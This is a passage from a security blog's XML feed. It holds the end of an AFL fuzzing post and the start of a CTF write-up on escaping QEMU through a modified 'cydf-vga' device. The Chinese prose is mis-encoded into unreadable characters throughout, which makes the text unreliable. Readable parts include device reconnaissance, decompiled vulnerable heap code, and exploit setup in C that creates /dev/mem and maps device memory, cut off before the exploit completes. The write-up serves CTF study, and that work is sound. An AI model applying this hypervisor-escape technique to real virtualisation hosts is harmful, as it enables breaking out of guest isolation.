·çš„ï¼Œè¿™é‡Œå°±ä¸å†ç»§ç»­è·‘äº†ã€‚</p><hr><p>å‚è€ƒèµ„æ–™:<br>    <a class="link"   href="https://xz.aliyun.com/t/4314" >https://xz.aliyun.com/t/4314<i class="fas fa-external-link-alt"></i></a><br>    <a class="link"   href="https://www.cjovi.icu/fuzzing/1138.html" >https://www.cjovi.icu/fuzzing/1138.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;æœ¬ç¯‡æ–‡ç« ä¸»è¦æ˜¯ä¸ºç½‘é¼æ¯çº¿ä¸‹èµ›åšå‡†å¤‡ï¼Œä¸ä¼šæ¶‰åŠåˆ°AFLçš„åŸç†ï¼Œä¸»è¦çš„æ–¹å‘ä¸ºAFLçš„ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;h2 id=&quot;AFL-FUZZä»‹ç»&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/categories/FUZZ/"/>
    
    
    <category term="AFL" scheme="https://cv196082.gitee.io/tags/AFL/"/>
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>q-escape</title>
    <link href="https://cv196082.gitee.io/2023/03/15/q-escape/"/>
    <id>https://cv196082.gitee.io/2023/03/15/q-escape/</id>
    <published>2023-03-15T08:45:50.000Z</published>
    <updated>2023-03-18T06:32:16.260Z</updated>
    
    <content type="html"><![CDATA[<p>è®¸ä¹…æ²¡æœ‰æ›´æ–°ï¼Œå‰æ®µæ—¶é—´ä¸€ç›´è€ƒè¯•æ‰€ä»¥ä¸€ç›´æ‹–ç€äº†ã€‚</p><h2 id="è®¾å¤‡åˆ†æ"><a href="#è®¾å¤‡åˆ†æ" class="headerlink" title="è®¾å¤‡åˆ†æ"></a>è®¾å¤‡åˆ†æ</h2><p>é¦–å…ˆçœ‹çœ‹å¼€äº†ä»€ä¹ˆä¿æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">âœ  q-escape checksec --file=./qemu-system-x86_64 </span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/Documents/pwn/qemu_escape/q-escape/qemu-system-x86_64&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å¼€å¯PIE</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-m 64 \</span><br><span class="line">-initrd ./initramfs.igz \</span><br><span class="line">-kernel ./vmlinuz-4.15.0-36-generic \</span><br><span class="line">-append <span class="string">&quot;priority=low console=ttyS0&quot;</span> \</span><br><span class="line">-nographic \</span><br><span class="line">-L ./pc-bios \</span><br><span class="line">-vga std \</span><br><span class="line">-device cydf-vga \</span><br><span class="line">-monitor telnet:127.0.0.1:2222,server,nowait</span><br></pre></td></tr></table></figure><p>è®¾å¤‡åä¸º<code>cydf-vga</code>å¹¶ä¸”å…è®¸è¿æ¥ã€‚</p><p>å°†qemu-system-x86_64æ‹–å…¥idaä¸­ï¼ŒæŸ¥æ‰¾ä¸è®¾å¤‡cydf-vgaç›¸å…³çš„å‡½æ•°ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315122813653.png"                      alt="image-20230315122813653"                ></p><p>å…ˆåˆ†æcydf_vga_class_initåˆå§‹åŒ–å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">cydf_vga_class_init</span><span class="params">(ObjectClass_0 *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rbx</span></span><br><span class="line">  PCIDeviceClass *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3223</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3224</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3-&gt;realize = pci_cydf_vga_realize;</span><br><span class="line">  v3-&gt;romfile = <span class="string">&quot;vgabios-cydf.bin&quot;</span>;</span><br><span class="line">  v3-&gt;vendor_id = <span class="number">0x1013</span>;</span><br><span class="line">  v3-&gt;device_id = <span class="number">0xB8</span>;</span><br><span class="line">  v3-&gt;class_id = <span class="number">0x300</span>;</span><br><span class="line">  v2-&gt;parent_class.desc = <span class="string">&quot;Cydf CLGD 54xx VGA&quot;</span>;</span><br><span class="line">  v2-&gt;parent_class.categories[<span class="number">0</span>] |= <span class="number">0x20</span>uLL;</span><br><span class="line">  v2-&gt;parent_class.vmsd = &amp;vmstate_pci_cydf_vga;</span><br><span class="line">  v2-&gt;parent_class.props = pci_vga_cydf_properties;</span><br><span class="line">  v2-&gt;parent_class.hotpluggable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>device_id</code>ä¸º0xB8ï¼Œ<code>vendor_id</code>ä¸º0x1013ï¼Œ<code>class_id</code>ä¸º0x300ã€‚å¹¶ä¸”å¯ä»¥çœ‹åˆ°çˆ¶ç±»çš„æè¿°ä¸º<code>Cydf CLGD 54xx VGA</code>ã€‚åˆç†çŒœæµ‹æ˜¯æ ¹æ®åŸæœ¬çš„æ”¹çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">âœ  display git:(master) grep -r <span class="string">&#x27;CLGD 54xx VGA&#x27;</span> ./ </span><br><span class="line">./cirrus_vga_rop.h: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga_isa.c: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support</span><br><span class="line">./cirrus_vga_internal.h: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support</span><br><span class="line">./cirrus_vga_rop2.h: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga.c: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga.c:    dc-&gt;desc = <span class="string">&quot;Cirrus CLGD 54xx VGA&quot;</span>;</span><br></pre></td></tr></table></figure><p>äº‹å®ä¹Ÿæ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># lspci</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0300: 1013:00b8 &lt;-- cydf_vga</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fa000000 0x00000000fbffffff 0x0000000000042208</span><br><span class="line">0x00000000febc1000 0x00000000febc1fff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x00000000febb0000 0x00000000febbffff 0x0000000000046200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸‰ä¸ªmmioç©ºé—´ã€‚é€šè¿‡äº¤å‰å¼•ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å“ªé‡Œæ³¨å†Œäº†IO</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315134309905.png"                      alt="image-20230315134309905"                ></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memory_region_init_io(&amp;s-&gt;cydf_vga_io, owner, &amp;cydf_vga_io_ops, s, <span class="string">&quot;cydf-io&quot;</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;low_mem, owner, &amp;cydf_vga_mem_ops, s, <span class="string">&quot;cydf-low-memory&quot;</span>, <span class="number">0x20000</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;cydf_mmio_io, owner, &amp;cydf_mmio_io_ops, s, <span class="string">&quot;cydf-mmio&quot;</span>, <span class="number">0x1000</span>uLL);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…³æ³¨ä¸cydfç›¸å…³çš„ç©ºé—´æ³¨å†Œï¼Œæ ¹æ®å¤§å°æ¥çœ‹ç¬¬ä¸€ä¸ªå°±æ˜¯pmioï¼Œåªä¸è¿‡åœ¨resourceæ–‡ä»¶å†…æ²¡æœ‰èŒƒå›´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/ioports </span></span><br><span class="line">0000-0cf7 : PCI Bus 0000:00</span><br><span class="line">  0000-001f : dma1</span><br><span class="line">  0020-0021 : pic1</span><br><span class="line">  0040-0043 : timer0</span><br><span class="line">  0050-0053 : timer1</span><br><span class="line">  0060-0060 : keyboard</span><br><span class="line">  0064-0064 : keyboard</span><br><span class="line">  0070-0071 : rtc0</span><br><span class="line">  0080-008f : dma page reg</span><br><span class="line">  00a0-00a1 : pic2</span><br><span class="line">  00c0-00df : dma2</span><br><span class="line">  00f0-00ff : fpu</span><br><span class="line">  0170-0177 : 0000:00:01.1</span><br><span class="line">    0170-0177 : ata_piix</span><br><span class="line">  01f0-01f7 : 0000:00:01.1</span><br><span class="line">    01f0-01f7 : ata_piix</span><br><span class="line">  0376-0376 : 0000:00:01.1</span><br><span class="line">    0376-0376 : ata_piix</span><br><span class="line">  03c0-03df : vga+</span><br><span class="line">  03f6-03f6 : 0000:00:01.1</span><br><span class="line">    03f6-03f6 : ata_piix</span><br><span class="line">  03f8-03ff : serial</span><br><span class="line">  0510-051b : QEMU0002:00</span><br><span class="line">  0600-063f : 0000:00:01.3</span><br><span class="line">    0600-0603 : ACPI PM1a_EVT_BLK</span><br><span class="line">    0604-0605 : ACPI PM1a_CNT_BLK</span><br><span class="line">    0608-060b : ACPI PM_TMR</span><br><span class="line">  0700-070f : 0000:00:01.3</span><br><span class="line">0cf8-0cff : PCI conf1</span><br><span class="line">0d00-ffff : PCI Bus 0000:00</span><br><span class="line">  afe0-afe3 : ACPI GPE0_BLK</span><br><span class="line">  c000-c03f : 0000:00:03.0</span><br><span class="line">  c040-c04f : 0000:00:01.1</span><br><span class="line">    c040-c04f : ata_piix</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¤§å°åˆšå¥½ä¸º0x30çš„vga+çš„ç«¯å£èŒƒå›´ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315134724201.png"                      alt="image-20230315134724201"                ></p><p>æ ¹æ®å®šä¹‰çš„å‡½æ•°æ¥çœ‹æˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°vgaçš„æ˜ å°„ç©ºé—´ï¼Œé€šè¿‡è¿™ç¯‡æ–‡ç« <a class="link"   href="http://www.osdever.net/FreeVGA/vga/vgamem.htm" >vgamem<i class="fas fa-external-link-alt"></i></a>å¯ä»¥å¾—çŸ¥vgaçš„æ˜ å°„ç©ºé—´ä¸º<code>000a0000-000bffff</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/iomem </span></span><br><span class="line">00000000-00000fff : Reserved</span><br><span class="line">00001000-0009fbff : System RAM</span><br><span class="line">0009fc00-0009ffff : Reserved</span><br><span class="line">000a0000-000bffff : PCI Bus 0000:00</span><br><span class="line">000c0000-000c97ff : Video ROM</span><br><span class="line">000c9800-000ca5ff : Adapter ROM</span><br><span class="line">000ca800-000cadff : Adapter ROM</span><br><span class="line">000f0000-000fffff : Reserved</span><br><span class="line">  000f0000-000fffff : System ROM</span><br><span class="line">00100000-03fdffff : System RAM</span><br><span class="line">  01000000-01c031d0 : Kernel code</span><br><span class="line">  01c031d1-0266a03f : Kernel data</span><br><span class="line">  028e2000-02b3dfff : Kernel bss</span><br><span class="line">03fe0000-03ffffff : Reserved</span><br><span class="line">04000000-febfffff : PCI Bus 0000:00</span><br><span class="line">  fa000000-fbffffff : 0000:00:04.0</span><br><span class="line">  fc000000-fcffffff : 0000:00:02.0</span><br><span class="line">  feb40000-feb7ffff : 0000:00:03.0</span><br><span class="line">  feb80000-feb9ffff : 0000:00:03.0</span><br><span class="line">  febb0000-febbffff : 0000:00:04.0</span><br><span class="line">  febc0000-febc0fff : 0000:00:02.0</span><br><span class="line">  febc1000-febc1fff : 0000:00:04.0</span><br><span class="line">fec00000-fec003ff : IOAPIC 0</span><br><span class="line">fed00000-fed003ff : HPET 0</span><br><span class="line">  fed00000-fed003ff : PNP0103:00</span><br><span class="line">fee00000-fee00fff : Local APIC</span><br><span class="line">fffc0000-ffffffff : Reserved</span><br><span class="line">100000000-17fffffff : PCI Bus 0000:00</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ³¨å†Œçš„å¤§å°å’Œæ‰€çœ‹åˆ°çš„å…¶å®åœ°å€å¯ä»¥ç¡®å®šæ˜¯è¿™é‡Œ<code>000a0000-000bffff : PCI Bus 0000:00</code>ã€‚</p><p>å¹¶ä¸”åœ¨æºç ä¸­ä¹Ÿæœ‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***************************************</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  memory access between 0xa0000-0xbffff</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> ***************************************/</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>vga_mem</code>ç©ºé—´åœ¨resourceæ–‡ä»¶ä¸­å¹¶ä¸å­˜åœ¨ï¼Œæ‰€ä»¥æ— æ³•åƒå‰é¢ä¸€é“é¢˜ä¸€æ ·ä½¿ç”¨resource0æ–‡ä»¶å»è®¿é—®å†…å­˜äº†ã€‚è¿™æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>/dev/mem</code>æ–‡ä»¶ï¼Œ<code>dev/mem</code>æ˜¯ç‰©ç†å†…å­˜çš„å…¨æ˜ åƒï¼Œå¯ä»¥ç”¨æ¥è®¿é—®ç‰©ç†å†…å­˜ï¼Œç”¨mmapæ¥è®¿é—®ç‰©ç†å†…å­˜ä»¥åŠå¤–è®¾çš„IOèµ„æºï¼Œæ˜¯å®ç°ç”¨æˆ·ç©ºé—´é©±åŠ¨çš„ä¸€ç§æ–¹æ³•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"><span class="keyword">int</span> fd = open( <span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC );</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mmio_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xfebc1000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !mmio_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap mmio failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vga_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x20000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xa0000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !vga_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡½æ•°åˆ†æ"><a href="#å‡½æ•°åˆ†æ" class="headerlink" title="å‡½æ•°åˆ†æ"></a>å‡½æ•°åˆ†æ</h2><p>æ ¹æ®ä¸Šä¸€é“é¢˜çš„æµç¨‹æ¥çœ‹ï¼Œè¿™é‡Œéœ€è¦åˆ†æåˆ†æç»“æ„ä½“äº†ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315135737136.png"                      alt="image-20230315135737136"                ></p><p>åœ¨å¯¹æ¯”ä¸¤ä¸ªç»“æ„ä½“çš„ç»“æœå‘ç°äº†æºæ–‡ä»¶ä¸­ä¸å­˜åœ¨<code>VulnState_0 vs[16];uint32_t latch[4];</code>è¿™æ ·ä¸¤ä¸ªå±æ€§ã€‚å¹¶ä¸”è¿˜æ˜æ˜¾çš„è¯´äº†æ˜¯<code>VulnState_0</code>ã€‚é€šè¿‡æºç å¯¹æ¯”å‘ç°ï¼Œæºç ä¸­è€ƒè™‘åœ°å€çš„æƒ…å†µåªæœ‰<code>addr &lt; 0x10000</code>ï¼Œ<code>addr &gt;= 0x18000 &amp;&amp; addr &lt; 0x18100</code></p><p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ–°çš„ï¼Œä¹Ÿå°±æ˜¯å¤§äº<code>0x18100</code>çš„æƒ…å†µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">v5 = opaque-&gt;vga.sr[<span class="number">0xCC</span>] % <span class="number">5u</span>;</span><br><span class="line"><span class="keyword">if</span> ( *(_WORD *)&amp;opaque-&gt;vga.sr[<span class="number">0xCD</span>] )</span><br><span class="line">  LODWORD(mem_value) = (opaque-&gt;vga.sr[<span class="number">0xCD</span>] &lt;&lt; <span class="number">16</span>) | (opaque-&gt;vga.sr[<span class="number">0xCE</span>] &lt;&lt; <span class="number">8</span>) | mem_value;</span><br><span class="line"><span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = BYTE2(mem_value);</span><br><span class="line">  <span class="keyword">if</span> ( v21 &lt;= <span class="number">0x10</span> &amp;&amp; opaque-&gt;vs[v21].buf )</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">2u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">0x4CF9</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt;= *((_DWORD *)v6 + <span class="number">0x4CF8</span>) )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      LABEL_26:</span><br><span class="line">      *((_DWORD *)v6 + <span class="number">0x4CF9</span>) = v8 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v7 + v8) = mem_value;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">19705</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt; <span class="number">0xFFF</span> )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">    &#125;</span><br><span class="line">    LABEL_35:</span><br><span class="line">    v17 = vulncnt;</span><br><span class="line">    <span class="keyword">if</span> ( vulncnt &lt;= <span class="number">0x10</span> &amp;&amp; (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span class="number">0x1000</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      mem_valuea = mem_value;</span><br><span class="line">      v18 = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> __int16)mem_value);</span><br><span class="line">      v19 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * v17;</span><br><span class="line">      *((_QWORD *)v19 + <span class="number">9851</span>) = v18;</span><br><span class="line">      <span class="keyword">if</span> ( v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        vulncnt = v17 + <span class="number">1</span>;</span><br><span class="line">        *((_DWORD *)v19 + <span class="number">19704</span>) = mem_valuea;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE2(mem_value) &lt;= <span class="number">0x10</span>uLL )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)v20 + <span class="number">9851</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span 